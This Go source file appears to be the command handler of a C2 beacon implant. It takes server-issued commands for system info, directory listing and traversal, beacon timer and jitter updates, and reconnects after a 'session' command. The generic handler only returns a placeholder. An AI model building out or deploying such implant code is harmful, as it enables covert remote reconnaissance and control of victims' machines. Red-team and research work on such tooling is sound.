package beaconhandler

import (
	"encoding/json"
	"fmt"
	"log"
	"strings"

	httpFuncs "src/Client/beacon/http"
	"src/Client/generic/commands"
	"src/Client/generic/config"
	"src/Client/generic/logger"
)

// executeCommand dispatches a single command to the appropriate handler and returns its report.
func executeCommand(command httpFuncs.CommandData) httpFuncs.CommandReport {
	if command.Command == "" || command.CommandUUID == "" {
		logger.Error("Invalid command format received (empty command or uuid).")
		return httpFuncs.CommandReport{
			Output:      "Error: Invalid command format from server.",
			CommandUUID: command.CommandUUID,
		}
	}

	var commandData string
	if err := json.Unmarshal(command.Data, &commandData); err != nil {
		logger.Error(fmt.Sprintf("Failed to unmarshal path from command data: %v. Data: %s", err, string(command.Data)))

		return httpFuncs.CommandReport{
			Output:      "Error: Malformed command data.",
			CommandUUID: command.CommandUUID}
	}

	logger.Log(fmt.Sprintf("Executing command: '%s' (uuid: %s)", command.Command, command.CommandUUID))
	var outputMsg string

	switch command.Command {
	case "update":
		logger.Log("Processing 'update' command.")
		outputMsg = handleUpdateCommand(command.Data)
	case "systeminfo":
		logger.Log("Processing 'systemInfo' command.")
		outputMsg = commands.SysInfoString()
	case "list_dir":
		logger.Log("Processing 'listDirectory' command.")
		outputMsg = commands.DirOutputAsString(commandData)
	case "directory_traversal":
		logger.Log("Running a dir traversal")
		outputMsg = commands.DirectoryTraversal(commandData)
	default:
		logger.Log(fmt.Sprintf("Processing generic command: '%s'", command.Command))
		outputMsg = handleGenericCommand(command)
	}

	return httpFuncs.CommandReport{Output: outputMsg, CommandUUID: command.CommandUUID}
}

// handleUpdateCommand processes the 'update' command, modifying the agent's config.
func handleUpdateCommand(data json.RawMessage) string {
	logger.Log("Handling 'update' command with provided data.")
	var updateData httpFuncs.UpdateCommandPayload
	if err := json.Unmarshal(data, &updateData); err != nil {
		logger.Error(fmt.Sprintf("Failed to unmarshal update command data: %v. Data: %s", err, string(data)))
		return "Error: Malformed data for 'update' command: " + err.Error()
	}

	var outputMsgs []string
	config.ConfigMutex.Lock()
	defer config.ConfigMutex.Unlock()

	if updateData.Timer > 0 {
		config.Timer = updateData.Timer
		outputMsgs = append(outputMsgs, fmt.Sprintf("Timer set to %d", config.Timer))
		logger.Log(fmt.Sprintf("Timer updated to %d seconds", config.Timer))
	}
	if updateData.Jitter >= 0 {
		config.Jitter = updateData.Jitter
		outputMsgs = append(outputMsgs, fmt.Sprintf("Jitter set to %d", config.Jitter))
		logger.Log(fmt.Sprintf("Jitter updated to %d seconds", config.Jitter))
	}

	if len(outputMsgs) == 0 {
		logger.Warn("No valid timer or jitter values provided in update command.")
		return "Error: No valid timer or jitter values provided."
	}
	return strings.Join(outputMsgs, ", ")
}

// handleGenericCommand processes any command that isn't a special case.
func handleGenericCommand(command httpFuncs.CommandData) string {
	var cmdDataStr string
	if err := json.Unmarshal(command.Data, &cmdDataStr); err != nil {
		// If data isn't a simple string, use its raw representation.
		cmdDataStr = string(command.Data)
		if cmdDataStr == "null" {
			cmdDataStr = ""
		}
	}
	return fmt.Sprintf("Output for command '%s'", command.Command)
}

// handleSessionSideEffect initiates a reconnect if a 'session' command was processed.
func handleSessionSideEffect(command httpFuncs.CommandData) {
	if command.Command != "session" {
		return
	}
	logger.Warn("Session command processed, initiating reconnect.")
	// This logic might need adjustment based on how reconnects should affect the agent.
	// For now, it's assumed to be a fatal operation if it fails.
	go func() {
		config.ConfigMutex.RLock()
		agentID := config.ID
		jitter := config.Jitter
		timer := config.Timer
		config.ConfigMutex.RUnlock()
		_, _, err := httpFuncs.HTTPReconnect("", agentID, jitter, timer)
		if err != nil {
			log.Fatalf("FATAL: Failed to reconnect after session command: %v", err)
		}
	}()
}
